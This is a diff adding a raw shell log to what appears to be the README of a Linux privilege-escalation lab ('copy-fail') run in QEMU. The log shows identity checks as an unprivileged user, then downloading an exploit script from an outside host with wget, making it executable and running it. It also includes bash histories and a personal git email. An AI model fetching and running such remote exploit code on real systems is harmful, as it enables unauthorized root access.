@@ -136,3 +136,96 @@ Esta v2 incorpora los siguientes fixes respecto a la v1:
 - BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
 - BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
 - Workflow Actions: greps de verificación con `|| echo`, tolerantes
+
+
+
+respuestas
+# ¿Qué kernel corre?
+uname -r
+6.12.0
+lsmod | grep alg
+-sh: lsmod: not found
+
+# ¿Cuál es tu identidad actual? (debe ser student, NO root)
+id
+
+$ id
+uid=1001(student) gid=1001(student) groups=1001(student)
+~ $ who ami
+BusyBox v1.38.0.git (2026-05-11 12:48:19 UTC) multi-call binary.
+
+Usage: who [-aH]
+
+Show who is logged on
+
+        -a      Show all
+        -H      Print column headers
+~ $ whoami
+student
+cat /proc/modules | grep algif
+cat: can't open '/proc/modules': No such file or directory
+
+wget https://copy.fail/exp -O copy_fail_exp.py
+Resolving copy.fail (copy.fail)... 216.150.16.193, 216.150.1.193
+Connecting to copy.fail (copy.fail)|216.150.16.193|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain]
+Saving to: 'copy_fail_exp.py'
+
+copy_fail_exp.py            [ <=>                           ]     731  --.-KB/s    in 0s      
+
+2026-05-11 13:45:54 (35.8 MB/s) - 'copy_fail_exp.py' saved [731]
+chmod +x copy_fail_exp.py
+python3 copy_fail_exp.py
+
+    1  apt update
+    2  apt install gh
+    3  gp api user --jq '"\(.name) → \(.email // .login)"'
+    4  gh api user --jq '"\(.name) → \(.email // .login)"'
+    5  git config --global user.name "israelfarfan992-spec"
+    6  git config --global user.email "israelfarfan992@gmail.com"
+    7  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
+    8  make setup
+    9  make qemu
+   10  apt install -y file
+   11  make qemu
+   12  make setup
+   13  make qemu
+   14  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
+   15  make qemu
+   16  grep -n "qemu-system" Makefile
+   17  cat Makefile
+   18  cat scripts/04_run_qemu.sh
+   19  vim scripts/04_run_qemu.sh
+   20  make qemu
+   21  cat scripts/04_run_qemu.sh
+   22  vim scripts/04_run_qemu.sh
+   23  make qemu
+   24  wget https://copy.fail/exp -O copy_fail_exp.py
+   25  id
+   26  python3 copy_fail_exp.p
+   27  wget https://copy.fail/exp -O copy_fail_exp.py
+   28  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
+   29  wget https://copy.fail/exp -O copy_fail_exp.py
+   30  chmod +x copy_fail_exp.py
+   31  python3 copy_fail_exp.py
+   32  history
+   root@codespaces-8a0d6d:/workspaces/copy-fail-challenge-B# history
+    1  apt update
+    2  apt install gh
+    3  gp api user --jq '"\(.name) → \(.email // .login)"'
+    4  gh api user --jq '"\(.name) → \(.email // .login)"'
+    5  git config --global user.name "israelfarfan992-spec"
+    6  git config --global user.email "israelfarfan992@gmail.com"
+    7  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
+    8  make setup
+    9  make qemu
+   10  apt install -y file
+   11  make qemu
+   12  make setup
+   13  make qemu
+   14  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
+   15  make qemu
+   16  copy_fail_exp.py
+   17  histoty
+   18  history
